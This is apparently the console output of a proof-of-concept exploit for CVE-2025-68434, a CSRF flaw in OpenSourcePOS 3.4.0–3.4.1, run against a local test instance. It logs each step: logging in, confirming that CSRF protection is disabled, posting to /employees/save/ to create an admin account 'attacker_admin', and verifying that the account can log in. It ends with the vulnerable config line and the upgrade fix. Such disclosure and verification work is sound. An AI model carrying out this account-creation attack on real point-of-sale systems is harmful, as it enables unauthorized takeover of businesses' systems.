============================================================
CVE-2025-68434 - OpenSourcePOS CSRF Vulnerability PoC
============================================================
Target: http://localhost:8080
Affected: OSPOS 3.4.0 - 3.4.1
Root cause: CSRF filter disabled in app/Config/Filters.php
============================================================

[+] Target is reachable
[*] Logging in as admin...
[+] Admin login successful
[*] Verifying CSRF protection is disabled...
[+] CSRF protection is DISABLED - no CSRF token rejection
[*] Exploiting CSRF to create new admin account...
    Target: POST /employees/save/
    New user: attacker_admin
    Response status: 200
[+] Employee created successfully!
    Message: Employee add successful. Csrf Attacker
    Person ID: 5

============================================================
[+] VULNERABLE - CVE-2025-68434 CSRF Exploitation Successful!
============================================================

Evidence:
  - CSRF protection disabled: Yes
  - Created admin account: attacker_admin
  - Password: P@ssw0rd123

Impact:
  - Attacker can create admin accounts without CSRF token
  - Full system takeover possible
  - Complete loss of confidentiality, integrity, availability

Vulnerable code: app/Config/Filters.php line 73
  // 'csrf' => ['except' => 'login'],

Fix: Upgrade to version 3.4.2+
============================================================
[*] Verifying new admin account can login...
[+] New admin 'attacker_admin' login successful!
[+] Verification: New admin can login successfully

